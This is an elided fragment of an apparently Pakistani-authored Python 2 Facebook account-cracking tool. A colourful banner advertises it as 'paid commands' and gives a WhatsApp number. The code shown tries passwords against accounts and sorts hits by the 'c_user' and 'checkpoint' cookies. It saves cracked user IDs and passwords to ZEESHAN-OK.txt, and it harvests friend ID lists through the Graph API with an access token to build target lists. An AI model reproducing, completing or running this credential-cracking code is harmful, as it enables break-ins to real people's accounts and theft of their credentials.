...
'\x1b[1;97m'   Author      :      ZEESHAN     
'\x1b[1;92m'   Github      :      NAYAB PARI  
'\x1b[1;93m'   FB ID       :      ZEESHAN
'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS
'\x1b[1;96m'   WAP NUMBER  :    +923047274393         
"""
dec="2"
server="2"
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[ZEESHAN-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[ZEESHAN-CP] "+coc+user + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[ZEESHAN-OK] "+uid + " | " + pass3
                                    cp=open('ZEESHAN-OK.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From ZEESHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
